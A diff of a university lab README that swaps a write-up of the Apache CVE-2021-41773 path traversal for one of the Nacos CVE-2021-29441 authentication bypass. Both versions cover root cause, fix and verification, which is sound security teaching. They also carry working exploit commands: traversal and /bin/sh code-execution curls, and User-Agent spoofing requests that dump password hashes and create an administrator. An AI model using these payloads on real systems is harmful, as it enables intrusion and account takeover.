@@ -1,36 +1,32 @@
-# CVE-2021-41773 — Apache HTTP Server 2.4.49 path traversal → file disclosure → RCE
+# CVE-2021-29441 — Nacos authentication bypass via a spoofed `User-Agent`
 
-This folder is the vulnerable-environment part of Lab 1. It contains the
-launcher, the exploit, the patch and the verification script for the CVE that
-was selected for the second half of the assignment.
+This folder is the vulnerable-environment part of Lab 1: the launcher, the
+exploit, the patch and the verification script for the CVE chosen for the
+second half of the assignment.
 
 | Property | Value |
 |---|---|
-| CVE | **CVE-2021-41773** |
-| Component | Apache HTTP Server 2.4.49 (core, `ap_normalize_path()`) |
-| Class | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory (path traversal) |
-| Related | CVE-2021-42013 (CVSS 9.8) — the *incomplete fix* shipped in 2.4.50 |
-| CVSS 3.1 | 7.5 HIGH — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (9.8 CRITICAL for the RCE / 42013 variant) |
-| Affected | 2.4.49 (and 2.4.50 for the 42013 bypass) |
-| Fixed in | **2.4.51** |
-| Public exploit | Yes; added to the CISA KEV catalogue on 2021-11-03 |
-| OWASP Top 10 | A01:2021 Broken Access Control, A05:2021 Security Misconfiguration, A08:2021 Software and Data Integrity Failures |
-| Vulhub path | `vulhub/httpd/CVE-2021-41773` |
+| CVE | **CVE-2021-29441** |
+| Component | Alibaba Nacos < 1.4.1 (the `AuthFilter` servlet filter) |
+| Class | CWE-290 — Authentication Bypass by Spoofing |
+| CVSS 3.1 | **8.6 HIGH** — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
+| Affected | every version before 1.4.1, **when authentication is enabled** |
+| Fixed in | 1.4.1 — the switch exists from there, but it defaults to *on*; see §6 |
+| OWASP Top 10 | A01:2021 Broken Access Control, A07:2021 Identification and Authentication Failures |
+| Vulhub path | `vulhub/nacos/CVE-2021-29441` |
 
 ---
 
 ## 1. Why this CVE
 
-* It has a **single root cause in one function**, so the analysis can be
-  precise instead of hand-wavy.
-* It is reproduced with **one `curl` command**, which makes the
-  before/after comparison in the report unambiguous.
-* The fix is a **version bump**, so the "did I actually fix it?" question has a
-  verifiable answer, and the same configuration is reused on both sides so
-  only one variable changes.
-* It chains three classic weaknesses — a path-normalisation bug, an
-  over-permissive `Require all granted`, and enabled CGI — which makes a good
-  discussion of defence in depth.
+* The root cause is a **single, quotable design flaw**: the `AuthFilter` trusts a
+  request header to decide "this call comes from another Nacos server".
+* The exploit is **two `curl` commands** with no payload crafting, which makes
+  the before/after comparison unambiguous.
+* The impact is not theoretical: the bypass reaches the **user-management API**,
+  so the attacker can read the password hashes *and* create an administrator.
+* The fix has a genuine wrinkle (see §6): upgrading alone does not close it,
+  because the vendor ships the new switch **enabled**.
 
 ---
 
@@ -38,76 +34,45 @@ was selected for the second half of the assignment.
 
 ```
 cve/
-├── Dockerfile                 # vulnerable: FROM vulhub/httpd:2.4.49  + vulhub's config tweaks
-├── docker-compose.yml         # runs it on http://localhost:8080
-├── Dockerfile.fixed           # fixed:      FROM httpd:2.4.51        + identical config
-├── docker-compose.fixed.yml   # same port, same config
-├── exploit.ps1 / exploit.sh   # reproduce (traversal + RCE)
-└── verify-fix.ps1 / verify-fix.sh   # assert the attack fails + regression check
+├── Dockerfile                 # Nacos 1.4.0, authentication ENABLED
+├── docker-compose.yml         # http://localhost:8848
+├── Dockerfile.fixed           # Nacos 1.4.1 + userAgentAuthWhite=false + server identity
+├── docker-compose.fixed.yml   # same port, same auth, only the fix differs
+├── exploit.ps1 / exploit.sh   # reproduce (leak + create admin)
+├── verify-fix.ps1 / verify-fix.sh   # assert the attack fails + regression check
+├── run-all.ps1                # orchestrate the whole cycle, write cve/evidence/
+└── README.md                  # this file
 ```
 
-The two `sed` lines in the Dockerfiles are what make the flaw *exploitable*:
-
-```dockerfile
-# enable mod_cgi / mod_cgid  -> the traversal can reach /bin/sh
-sed -i "s|#LoadModule cgi_module modules/mod_cgi.so|LoadModule cgi_module modules/mod_cgi.so|g" ...
-# relax <Directory /> -> files outside the DocumentRoot are readable
-perl -pe 's|<Directory />.*?</Directory>|<Directory />\n    Require all granted\n</Directory>|isg'
-```
-
-Without `Require all granted` the escaped path is answered with `403` by the
-default `Require all denied`, which is why the advisory says the issue is
-exploitable "if files outside of these directories are not protected by the
-usual default configuration".
+> **Why not just use `vulhub/nacos:1.4.0`?** Because that image ships
+> `nacos.core.auth.enabled=false`. With authentication off *everything* is
+> reachable and the `User-Agent` header is irrelevant — that demo would not be
+> about the CVE at all. Both of our images therefore set
+> `nacos.core.auth.enabled=true`, which is exactly the precondition the advisory
+> names ("when configured to use authentication").
 
 ---
 
 ## 3. Launch
 
-**One command (recommended, Windows).** Runs the whole experiment — vulnerable
-build → exploit → teardown → patched build → verify → teardown — and writes the
-transcripts to `cve/evidence/` so the report can quote real output:
+**One command (recommended, Windows)** — vulnerable build → exploit → teardown →
+patched build → verify → teardown, with the transcripts saved to `cve/evidence/`:
 
 ```powershell
 cd cve
-powershell -ExecutionPolicy Bypass -File .\run-all.ps1   # add -KeepRunning to keep it running
-
-> Default Windows PowerShell refuses to run unsigned scripts; the line above bypasses
-> that for this one process. `Set-ExecutionPolicy -Scope Process Bypass` does the same.
-
+powershell -ExecutionPolicy Bypass -File .\run-all.ps1
 ```
-
-It exits 0 only when the vulnerable build *was* exploited **and** the fixed
-build rejected every variant; if the exploit does not reproduce it says so and
-exits 1.
 
 Manual equivalent:
 
 ```bash
 cd cve
-docker compose up -d --build          # first build pulls ~55 MB
-docker compose ps
-curl -s http://127.0.0.1:8080/        # -> It works!
+docker compose up -d --build      # first build downloads the 1.4.0 tarball (~100 MB)
+curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8848/nacos/   # -> 200
 ```
 
-> Prefer the original Vulhub directory? `git clone https://github.com/vulhub/vulhub.git`
-> then `cd vulhub/httpd/CVE-2021-41773 && docker compose up -d` — the base image
-> and the configuration are the same.
-
-
-### 方案 D：不装 Docker，直接在 GitHub 上跑
-
-仓库里有 `.github/workflows/cve-repro.yml`，**手动触发**即可在 GitHub 的 runner
-（自带 Docker）上完成整套复现 —— 不需要你本机装任何东西：
-
-1. push 仓库后打开 **Actions** → 左侧 **CVE reproduction (manual)** → **Run workflow**；
-2. 等约 3–5 分钟；
-3. 结果出现在两处：
-   * 这次运行的 **Summary** 页面（漏洞版与修复版的完整转录）；
-   * Artifacts 里的 `cve-evidence.zip`。
-
-这份转录带时间戳、可复跑，比本地手工截图更硬；报告里可以引用运行链接。
-（该工作流只手动触发，不会在 push 时自动执行，且 runner 用完即销毁。）
+> Nacos is a Spring Boot application: allow **30–60 s** after `up` before the
+> port answers.
 
 ---
 
@@ -123,29 +88,44 @@ powershell -ExecutionPolicy Bypass -File .\cve\exploit.ps1
 or manually:
 
 ```bash
-# 1. the alias directory must exist (/icons/ is created by httpd-autoindex.conf)
-curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/icons/
+# 1. baseline: authentication is on, anonymous access is refused
+curl -s -o /dev/null -w '%{http_code}\n' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
+# -> 403  {"status":403,"error":"Forbidden","message":"unknown user!"}
 
-# 2. path traversal: %2e is a URL-encoded '.', --path-as-is stops curl from
-#    normalising the request target for us
-curl --path-as-is 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+# 2. the bypass: the same request, plus one header
+curl -s -H 'User-Agent: Nacos-Server' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
+# -> 200  {"totalCount":1,"pageItems":[{"username":"nacos","password":"$2a$10$..."}]}
 
-# 3. optional: code execution because mod_cgi is enabled
-curl --path-as-is --data 'echo;id' \
-  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+# 3. impact: create an administrator without any credentials
+curl -s -X POST -H 'User-Agent: Nacos-Server' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?username=pwned&password=Passw0rd123'
+# -> 200  {"code":200,"message":"create user ok!","data":null}
 ```
 
-Expected on the vulnerable build:
+Measured on the vulnerable build (2026-10-19, full transcript in
+`cve/evidence/vulnerable.txt`):
 
 ```
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
+1. Sanity check: GET /nacos/                              HTTP 200
+
+2. Baseline: GET /nacos/v1/auth/users  (no header)        HTTP 403
+   {"timestamp":"...","status":403,"error":"Forbidden","message":"unknown user!"}
+
+3. Bypass: same request with 'User-Agent: Nacos-Server'   HTTP 200
+   {"totalCount":1,"pageNumber":1,"pageItems":[
+      {"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}]}
+   >>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.
+
+4. Impact: create an admin account through the same bypass
+   {"code":200,"message":"create user ok!","data":null}
+   >>> VULNERABLE: 'pwned4779' was created without any credentials
 ```
 
-`--path-as-is` matters: without it curl collapses `/icons/.%2e/../` on the
-client and the request never leaves the document root.
+From there the attacker logs in at `http://127.0.0.1:8848/nacos/` with the
+account just created and holds full administrative access (namespaces, configs,
+service registry).
 
 ---
 
@@ -153,141 +133,159 @@ client and the request never leaves the document root.
 
 ### 5.1 The defect
 
-Apache 2.4.49 replaced the old request-URI normalisation with a new function,
-`ap_normalize_path()` in `server/request.c`. The new implementation scans the
-path once and, while scanning, both
+When authentication is enabled, every request passes through `AuthFilter`
+(`com.alibaba.nacos.core.auth.AuthFilter`). The filter has a short-circuit for
+**server-to-server** traffic:
 
-1. **decodes** percent-encoded octets (`%2e` → `.`), and
-2. **decides** whether the current segment is a dot-segment (`.` or `..`) that
-   must be collapsed.
-
-The two operations are applied in the wrong order: the dot-segment decision is
-made on the characters that are still encoded. A segment written as
-
-```
-.%2e          # not "..", so it is not recognised as a traversal segment
+```java
+// Nacos 1.4.0, simplified
+if (userAgent.equals("Nacos-Server")) {
+    return chain.doFilter(request, response);   // skip every auth check
+}
 ```
 
-therefore survives normalisation, and is only turned into the real string `..`
-by the later decode pass. The normalised path handed to the core mapper still
-contains a live `..`.
+The short-circuit is justified by the assumption "only a Nacos server would send
+this header". That assumption is the bug: **a header is attacker-controlled
+data, not an identity**. Anyone can type the string.
 
-`ap_core_translate()` then maps that path onto the filesystem through the
-`Alias /icons/ ...` directive without re-checking that the result is still
-inside the aliased directory. `..` does what `..` always does: it walks out.
+So the failure is not "a missing check"; it is a **trust decision made on a
+spoofable input** — the textbook shape of CWE-290, Authentication Bypass by
+Spoofing. The filter also gave the shortcut more power than it needed: it
+skipped *all* authorisation, including the user-management API, which is why the
+impact is "any administrative task" rather than "read one config".
 
-So the failure is not "missing input validation" in the naive sense — the
-input *is* validated, but the validator and the decoder disagree about what
-the string means (**normalisation/decoding order bug**, a classic
-canonicalisation error). This is exactly the CWE-22 shape: the check and the
-use resolve the same name differently, so a name that passes the check is not
-the name that gets opened.
+### 5.2 Why the configuration matters
 
-### 5.2 The amplification
+The advisory is explicit: this is exploitable *when configured to use
+authentication*. Two consequences worth understanding:
 
-Two configuration choices turn a file-read into a full compromise:
+* if `nacos.core.auth.enabled=false` (the default, and what the stock Vulhub
+  image ships), the bypass is invisible — the server is open anyway, so the
+  missing check changes nothing;
+* the vulnerability is therefore a **broken access-control design**, not "the
+  default config is insecure". Turning auth on is what makes the bypass
+  meaningful, and turning auth off is not a fix — it only hides the symptom.
 
-| Config | Effect |
-|---|---|
-| `<Directory /> Require all granted` | The escaped path is *authorised*, so `/etc/passwd`, `/etc/shadow`-adjacent files, application secrets, cloud metadata (169.254.169.254) become readable. |
-| `LoadModule cgi_module` | The traversal can reach `/bin/sh` under `/cgi-bin/`, i.e. arbitrary command execution as the `daemon` user → container escape attempts, lateral movement. |
-
-That is why the same code defect is rated 7.5 (disclosure) in one deployment
-and 9.8 (RCE) in another: **the impact is configuration-dependent, the defect
-is not.**
-
-### 5.3 Why the first patch was not enough
-
-2.4.50 added a filter that rejected the literal sequence `%2e` in the path.
-Because the filter ran on the *encoded* form, double encoding slipped through:
+### 5.3 The impact chain
 
 ```
-%%32%65   -- decodes once to %2e, which decodes again to .
+spoofed header ──► AuthFilter short-circuit ──► /v1/auth/users
+                                             ├─ GET  → user table + bcrypt hashes (offline cracking)
+                                             └─ POST → create an administrator
+                                                          └─► full console access
 ```
 
-That bypass is CVE-2021-42013 (CVSS 9.8). 2.4.51 abandoned the blacklist and
-rewrote normalisation so that decoding happens first, dot segments are
-collapsed on the decoded string, and any path that would climb above the root
-is rejected outright. The lesson for the report: **filtering encoded input is
-a losing game; canonicalise first, then validate, then use.**
+The hashes are bcrypt (`$2a$10$`), so cracking is slow — but nothing has to be
+cracked: creating a *new* administrator is instant and leaves less noise.
 
 ---
 
-## 6. The fix that was applied
+## 6. The fix, and the wrinkle
 
-`Dockerfile.fixed` changes exactly one line:
+`Dockerfile.fixed` builds **Nacos 1.4.1** — the version that puts the hard-coded
+`User-Agent` shortcut behind a switch:
+
+```
+nacos.core.auth.enable.userAgentAuthWhite=true
+```
+
+**1.4.1 ships that switch turned ON** for backwards compatibility with existing
+clusters, so a plain version bump does **not** close the hole. We verified it:
+on a stock 1.4.1 the spoofed header still returned the user table. The real fix
+is therefore two steps:
 
 ```diff
--FROM vulhub/httpd:2.4.49
-+FROM httpd:2.4.51
+-  NACOS_VERSION=1.4.0
++  NACOS_VERSION=1.4.1
++  nacos.core.auth.enable.userAgentAuthWhite=false
 ```
 
-Every configuration line stays the same (CGI enabled, `Require all granted`,
-autoindex included), so the experiment isolates one variable: the patched
-normalisation code. If the attack now fails, it fails *because of the code
-fix*, not because a setting was flipped.
+and, because disabling the whitelist makes 1.4.1 demand a **server identity**
+for legitimate internal calls, a third setting is required — otherwise the
+server rejects *everything*, console included:
+
+```
+nacos.core.auth.server.identity.key=lab1server
+nacos.core.auth.server.identity.value=lab1secret
+```
+
+With all three in place the same requests are refused:
 
 ```bash
-docker compose down                                   # stop the vulnerable build
-docker compose -f docker-compose.fixed.yml up -d --build
+curl -s -o /dev/null -w '%{http_code}\n' -H 'User-Agent: Nacos-Server' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
+# -> 403
+# {"status":403,"error":"Forbidden",
+#  "message":"Invalid server identity key or value, Please make sure set
+#             `nacos.core.auth.server.identity.key` and
+#             `nacos.core.auth.server.identity.value`, or open
+#             `nacos.core.auth.enable.userAgentAuthWhite`"}
+```
+
+and the console still answers (`GET /nacos/` → 200), which is what the
+regression check is for.
+
+The lesson mirrors the Apache case from the other half of this lab: **"fixed in
+version X" is not the same as "fixed".** Read the advisory, read the release
+notes, and verify the behaviour yourself.
+
+---
+
+## 7. Verification
+
+```bash
 powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
+# or
+./cve/verify-fix.sh
 ```
 
-Expected:
+Measured output:
 
 ```
-[PASS] home page still returns 200
-[PASS] traversal rejected with 400/403/404
-[PASS] no /etc/passwd content in the body
-[PASS] no uid= in the response
-[PASS] no leak for /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname
-[PASS] no leak for /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
-[PASS] no leak for /.%2e/.%2e/.%2e/.%2e/etc/passwd
-[PASS] no leak for /icons/..%2f..%2f..%2f..%2fetc%2fpasswd
+1. Regression check: GET /nacos/
+[PASS] console still returns 200
+
+2. Bypass must fail: GET with 'User-Agent: Nacos-Server'
+GET /nacos/v1/auth/users?pageNo=1&pageSize=9 -> HTTP 403
+[PASS] returns 403 instead of 200
+[PASS] no user table in the body
+
+3. Creating an account must fail
+[PASS] no 'create user ok'
+
+4. Authentication is still enabled
+GET /nacos/v1/auth/users?pageNo=1&pageSize=9 (no credentials) -> HTTP 403
+[PASS] anonymous access still refused
+
 RESULT: fix verified -- all checks passed.
 ```
 
-The last four checks matter: fixing only the exact string from the advisory
-would be a *blacklist* fix, and the 2.4.50 story shows how that ends. The
-verification therefore replays the whole family of traversal spellings.
+Check 4 matters as much as the others: "the attack fails because authentication
+was switched off" would be a regression disguised as a fix. The script asserts
+that anonymous access is *still* refused.
 
 ---
 
-## 7. Defence in depth (recommended in addition to the patch)
+## 8. Defence in depth
 
-The version bump is the *actual* fix; these reduce blast radius if a future
-normalisation bug appears:
-
-```apache
-# 1. never hand the whole filesystem to the server
-<Directory />
-    AllowOverride none
-    Require all denied
-</Directory>
-
-# 2. only enable CGI where it is really needed, and drop the privilege
-# 3. run the container read-only with a non-root user
-# 4. drop capabilities and use a minimal base image
-# 5. keep the container network egress-restricted (blocks metadata SSRF)
-# 6. add a WAF rule as a stop-gap, not as the fix
-```
-
-In `docker-compose.yml` terms:
-
-```yaml
-    read_only: true
-    user: "1000:1000"
-    security_opt: ["no-new-privileges:true"]
-    cap_drop: ["ALL"]
-```
+* Never authorise on a request header. If internal traffic must be recognised,
+  use a **secret** the attacker cannot guess (`server.identity.key/value`) or
+  mutual TLS, and scope the exemption to the narrowest possible set of paths.
+* Keep the bypass switch off (`userAgentAuthWhite=false`) and rotate the server
+  identity when a node leaves the cluster.
+* Put the console/API behind a network policy — Nacos is normally an internal
+  component and has no business being reachable from the internet.
+* Alert on `User-Agent: Nacos-Server` arriving from an address that is not a
+  known cluster node.
+* Treat the console as an administrative plane: separate credentials, 2FA at the
+  proxy, audit-log shipping.
 
 ---
 
-## 8. References
+## 9. References
 
-* Apache HTTP Server 2.4 vulnerabilities — <https://httpd.apache.org/security/vulnerabilities_24.html>
-* CVE-2021-41773 / CVE-2021-42013 records — <https://www.cve.org/CVERecord?id=CVE-2021-42013>
-* CISA KEV catalogue (added 2021-11-03) — <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>
-* Vulhub `httpd/CVE-2021-41773` — <https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773>
-* CWE-22 — <https://cwe.mitre.org/data/definitions/22.html>
-* OWASP Top 10 2021 A01 — <https://owasp.org/Top10/A01_2021-Broken_Access_Control/>
+* GHSA-36hp-jr8h-556f — <https://github.com/advisories/GHSA-36hp-jr8h-556f>
+* Nacos issue #4701 / PR #4703 — <https://github.com/alibaba/nacos/issues/4701>, <https://github.com/alibaba/nacos/pull/4703>
+* CVE record — <https://www.cve.org/CVERecord?id=CVE-2021-29441>
+* Vulhub `nacos/CVE-2021-29441` — <https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29441>
+* CWE-290 — <https://cwe.mitre.org/data/definitions/290.html>
